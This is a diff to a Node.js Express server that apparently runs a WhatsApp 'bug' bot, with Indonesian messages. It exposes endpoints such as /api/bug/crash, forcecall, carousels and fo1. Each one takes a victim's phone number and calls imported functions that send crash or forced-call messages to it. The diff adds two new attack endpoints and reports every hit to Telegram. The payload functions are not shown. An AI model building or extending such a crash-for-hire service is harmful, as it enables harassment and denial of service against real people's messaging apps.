@@ -37,7 +37,7 @@ const path = require("path");
 const app = express();
 const PORT = process.env.PORT || 5036
 
-const { XanfcXscary, XcrashXann, fo1} = require('./bugs');
+const { XanfcXscary, XcrashXann, fo1, bugCrash} = require('./bugs');
 const { getRequest, sendTele } = require('./telegram');
 
 app.enable("trust proxy");
@@ -82,7 +82,6 @@ async function clientstart() {
         console.log(`your pairing code: ${code}`);
     }
 
-    // Endpoint untuk status bot
     app.get('/api/status', (req, res) => {
         try {
             if (client.user?.id) {
@@ -97,14 +96,8 @@ async function clientstart() {
 
     app.get('/api/bug/carousels', async (req, res) => {
         const { target, fjids } = req.query;
-        if (!target) return res.status(400).json({
-            status: false,
-            message: "parameter target diperlukan"
-        });
-        if (!fjids) return res.status(400).json({
-            status: false,
-            message: "parameter fjids diperlukan"
-        });
+        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
+        if (!fjids) return res.status(400).json({ status: false, message: "parameter fjids diperlukan" });
         let bijipeler = target.replace(/[^0-9]/g, "");
         if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
         
@@ -112,38 +105,19 @@ async function clientstart() {
         const info = await getRequest(req);
         try {
             await XcrashXann(client, cuki, fjids);
-            res.json({
-                status: true,
-                creator: global.creator,
-                result: "sukses"
-            });
+            res.json({ status: true, creator: global.creator, result: "sukses" });
             console.log(`successfully sent carousels to number ${cuki}`);
-            const penis = `\n[API HIT]
-        
-Endpoint: Carousels2
-Target: ${target}
-IP: ${info.ip}
-Method: ${info.method}
-
-this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable
-
-${info.timestamp}`;
-            sendTele(penis);
+            const logMessage = `\n[API HIT]\n\nEndpoint: Carousels\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
+            sendTele(logMessage);
         } catch (error) {
             console.error(error);
-            res.status(500).json({
-                status: false,
-                error: error.message
-            });
+            res.status(500).json({ status: false, error: error.message });
         }
     });
 
     app.get('/api/bug/forcecall', async (req, res) => {
         const { target } = req.query;
-        if (!target) return res.status(400).json({
-            status: false,
-            message: "parameter target diperlukan"
-        });
+        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
         let bijipeler = target.replace(/[^0-9]/g, "");
         if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
         
@@ -151,32 +125,56 @@ ${info.timestamp}`;
         const info = await getRequest(req);
         try {
             await XanfcXscary(client, cuki);
-            res.json({
-                status: true,
-                creator: global.creator,
-                result: "sukses"
-            });
+            res.json({ status: true, creator: global.creator, result: "sukses" });
             console.log(`successfully sent forcecall to number ${cuki}`);
-            const penis = `\n[API HIT]
-        
-Endpoint: Forcecall
-Target: ${target}
-IP: ${info.ip}
-Method: ${info.method}
-
-this is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable
-
-${info.timestamp}`;
-            sendTele(penis);
+            const logMessage = `\n[API HIT]\n\nEndpoint: Forcecall\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
+            sendTele(logMessage);
         } catch (error) {
             console.error(error);
-            res.status(500).json({
-                status: false,
-                error: error.message
-            });
+            res.status(500).json({ status: false, error: error.message });
         }
     });
-    
+
+    app.get('/api/bug/fo1', async (req, res) => {
+        const { target } = req.query;
+        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
+        let bijipeler = target.replace(/[^0-9]/g, "");
+        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
+        
+        let cuki = bijipeler + '@s.whatsapp.net';
+        const info = await getRequest(req);
+        try {
+            await fo1(client, cuki);
+            res.json({ status: true, creator: global.creator, result: "sukses" });
+            console.log(`successfully sent fo1 to number ${cuki}`);
+            const logMessage = `\n[API HIT]\n\nEndpoint: ViewOnceMessage\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
+            sendTele(logMessage);
+        } catch (error) {
+            console.error(error);
+            res.status(500).json({ status: false, error: error.message });
+        }
+    });
+
+    app.get('/api/bug/crash', async (req, res) => {
+        const { target } = req.query;
+        if (!target) return res.status(400).json({ status: false, message: "parameter target diperlukan" });
+        let bijipeler = target.replace(/[^0-9]/g, "");
+        if (bijipeler.startsWith("0")) return res.json("gunakan awalan kode negara!");
+        
+        let cuki = bijipeler + '@s.whatsapp.net';
+        const info = await getRequest(req);
+        try {
+            await bugCrash(client, cuki);
+            res.json({ status: true, creator: global.creator, result: "sukses" });
+            console.log(`successfully sent crash to number ${cuki}`);
+            const logMessage = `\n[API HIT]\n\nEndpoint: Crash\nTarget: ${target}\nIP: ${info.ip}\nMethod: ${info.method}\n\nthis is a part of API monitoring system. every time an endpoint is accessed, data like target, IP, method, and time are recorded and sent as notifications. this helps in maintaining stable\n\n${info.timestamp}`;
+            sendTele(logMessage);
+        } catch (error) {
+            console.error(error);
+            res.status(500).json({ status: false, error: error.message });
+        }
+    });
+
     client.ev.on('connection.update', (update) => {
         const { konek } = require('./connect');
         konek({
